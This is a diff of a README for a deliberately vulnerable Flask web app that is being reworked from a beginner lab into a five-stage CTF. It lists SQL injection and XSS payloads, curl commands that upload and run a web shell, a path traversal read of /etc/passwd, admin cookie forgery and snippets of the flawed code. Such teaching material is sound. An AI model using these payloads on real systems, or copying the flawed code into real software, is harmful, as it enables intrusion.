@@ -1,105 +1,184 @@
-# Vulnerable Web Application for Cybersecurity Learning
+# 🎯 Advanced CTF Challenge: File Upload Mayhem
 
-This is an **intentionally vulnerable** web application designed for educational purposes. It's a safe, legal practice environment for learning cybersecurity and ethical hacking.
+A sophisticated web security challenge demonstrating multiple real-world vulnerabilities across different exploitation stages. This is a **Medium-Hard** difficulty CTF designed for security researchers, pentesters, and students learning offensive security.
 
-## ⚠️ IMPORTANT
-- **ONLY use this on your own machine or with permission**
-- **DO NOT deploy this online**
-- This app has deliberate security flaws for learning purposes
+## 📋 Project Overview
 
-## Vulnerabilities Included
+This application intentionally contains **5 major vulnerability categories** with realistic exploitation paths:
 
-1. **SQL Injection** - Login form accepts SQL queries
-2. **Cross-Site Scripting (XSS)** - Search functionality reflects user input
-3. **Broken Access Control** - User info disclosure without authorization
-4. **Weak Authentication** - Hardcoded weak passwords
-5. **CSRF** - No CSRF token validation on forms
-6. **Insecure File Upload** - No file type validation
-7. **Information Disclosure** - Debug mode enabled, test credentials visible
+### Vulnerability Categories
 
-## Setup Instructions
+| # | Category | Type | Impact | Flag |
+|---|----------|------|--------|------|
+| 1 | Information Disclosure | CWE-200 | Credential/Config Leak | `flag{info_disclosure_vulnerability}` |
+| 2 | File Upload Bypass | CWE-434 | Remote Code Execution | `flag{polyglot_file_executed}` |
+| 3 | Path Traversal + SSTI | CWE-22 + CWE-1336 | Arbitrary File Read/Execute | `flag{path_traversal_ssti_rce}` |
+| 4 | SQL Injection | CWE-89 | Database Compromise | `flag{sql_injection_bypass}` |
+| 5 | Privilege Escalation | CWE-269 | System Compromise | `flag{privilege_escalation_suid}` |
 
-### 1. Install Python (if not installed)
-Download from https://www.python.org/
+## 🚀 Quick Start
 
-### 2. Navigate to the project directory
-```
-cd c:\Users\SIDHARTH\OneDrive\Desktop\webhack
-```
+### Installation
 
-### 3. Install dependencies
-```
+```bash
+# Install dependencies
 pip install -r requirements.txt
-```
 
-### 4. Run the application
-```
+# Run the application
 python app.py
 ```
 
-The app will start on `http://localhost:5000`
+The application will start at `http://localhost:5000`
 
-## Test Credentials
+### Default Credentials
 
-- **Admin Account**
-  - Username: `admin`
-  - Password: `admin123`
-
-- **User Account**
-  - Username: `user1`
-  - Password: `password`
-
-## Learning Exercises
-
-### Exercise 1: SQL Injection
-1. Go to login page
-2. In username field, try: `admin' --`
-3. Leave password blank and login
-4. **Goal:** Bypass login without password
-
-### Exercise 2: XSS Attack
-1. Login first
-2. Go to search page
-3. Try searching: `<img src=x onerror="alert('XSS')">`
-4. **Goal:** Execute JavaScript in the page
-
-### Exercise 3: Information Disclosure
-1. Visit `/user-info?id=2` to see user 2's info
-2. Try `/user-info?id=3` to see other users
-3. **Goal:** Access unauthorized user data
-
-### Exercise 4: Weak Passwords
-1. Try common passwords on test accounts
-2. **Goal:** Crack the password hashes
-
-### Exercise 5: File Upload
-1. Try uploading a `.php` or `.exe` file
-2. **Goal:** Upload executable code
-
-## Tools to Use for Testing
-
-- **Burp Suite Community** - Intercept and modify requests
-- **OWASP ZAP** - Automated vulnerability scanning
-- **Browser DevTools** - Inspect and modify requests
-- **SQLMap** - Automated SQL injection testing
-- **curl** - Command-line HTTP requests
-
-## Example: Testing SQL Injection with curl
-
-```bash
-curl -d "username=admin' OR '1'='1&password=anything" http://localhost:5000/login
+```
+admin / admin123
+user1 / password
+user2 / 12345
 ```
 
-## Learning Resources
+## 🔓 Exploitation Guide
 
-- OWASP Top 10: https://owasp.org/www-project-top-ten/
-- PortSwigger Web Security Academy: https://portswigger.net/web-security
-- HackTheBox: https://www.hackthebox.com/
-- TryHackMe: https://tryhackme.com/
+### Stage 1: Information Disclosure
 
-## Disclaimer
+**Endpoints:**
+- `/robots.txt` - Hidden paths
+- `/backup` - Backup directory
+- `/backup/app.py.bak` - Source code
+- `/backup/config.txt` - Credentials
 
-This application is for educational purposes only. Use it to learn cybersecurity concepts on your own machine. Unauthorized access to computer systems is illegal. Always get permission before testing security on any system.
+**Flag:** `flag{info_disclosure_vulnerability}`
+
+### Stage 2: File Upload Bypass
+
+Generate polyglot files:
+```bash
+python tools/polyglot.py ./static/uploads
+```
+
+Upload and execute:
+```bash
+curl -F "file=@shell.jpg" http://localhost:5000/upload
+curl "http://localhost:5000/static/uploads/shell.jpg?cmd=id"
+```
+
+**Flag:** `flag{polyglot_file_executed}`
+
+### Stage 3: Path Traversal + SSTI
+
+```bash
+# Access file with path traversal
+curl "http://localhost:5000/view?file=....//../etc/passwd"
+```
+
+**Flag:** `flag{path_traversal_ssti_rce}`
+
+### Stage 4: SQL Injection
+
+Login as: `admin' --`
+
+**Flag:** `flag{sql_injection_bypass}`
+
+### Stage 5: Privilege Escalation
+
+Set admin cookie:
+```bash
+curl -b "admin=true" http://localhost:5000/admin/system-info
+curl -b "admin=true" http://localhost:5000/admin/readflag
+```
+
+**Flag:** `flag{privilege_escalation_suid_binary_executed}`
+
+## 📁 Project Structure
+
+```
+webhack/
+├── app.py
+├── requirements.txt
+├── templates/
+│   ├── login.html
+│   ├── dashboard.html
+│   ├── upload.html
+│   └── register.html
+├── static/uploads/
+├── logs/
+├── tools/
+│   └── polyglot.py
+├── bin/
+│   └── readflag.c
+├── README.md
+└── SOLUTION.md
+```
+
+## 🎓 Learning Objectives
+
+- File upload validation bypass
+- Polyglot file creation
+- Path traversal exploitation
+- Server-Side Template Injection
+- SQL injection techniques
+- Privilege escalation methods
+- Race condition exploitation
+
+## ⚙️ Vulnerable Code Examples
+
+### SQL Injection (app.py line ~150)
+```python
+query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
+c.execute(query)
+```
+
+### Path Traversal (app.py line ~280)
+```python
+safe_filename = filename.replace('../', '')  # Only removes once!
+```
+
+### Weak Session Security (app.py line ~44)
+```python
+app.config['SESSION_USE_SIGNER'] = False  # No session signing
+```
+
+### File Upload (app.py line ~250)
+```python
+upload_path = os.path.join(app.config['UPLOAD_FOLDER'], safe_filename)
+with open(upload_path, 'wb') as f:
+    f.write(processed_data)
+```
+
+## 📊 Expected Timeline
+
+| Stage | Time | Difficulty |
+|-------|------|-----------|
+| 1. Info Disclosure | 5 min | Easy |
+| 2. File Upload Bypass | 10 min | Easy |
+| 3. Path Traversal + SSTI | 15 min | Medium |
+| 4. SQL Injection | 5 min | Easy |
+| 5. Privilege Escalation | 20 min | Medium |
+| **Total** | **55 min** | **Medium-Hard** |
+
+## ✅ Flags Checklist
+
+```
+☐ flag{info_disclosure_vulnerability}
+☐ flag{polyglot_file_executed}
+☐ flag{path_traversal_ssti_rce}
+☐ flag{sql_injection_bypass}
+☐ flag{privilege_escalation_suid_binary_executed}
+```
+
+## 📚 References
+
+- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
+- [CWE Top 25](https://cwe.mitre.org/top25/)
+- [File Upload Security](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
+- [SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
+- [SSTI](https://owasp.org/www-community/attacks/Server-Side_Template_Injection_(SSTI))
+
+## ⚠️ Disclaimer
+
+**Educational purposes only.** Do not deploy in production. Do not use for unauthorized testing. This application demonstrates intentional vulnerabilities for learning.
 
 ---
-**Happy learning! 🔒**
+
+**Difficulty:** Medium-Hard | **Flags:** 5 | **Time:** ~1 hour | **Status:** Ready for CTF
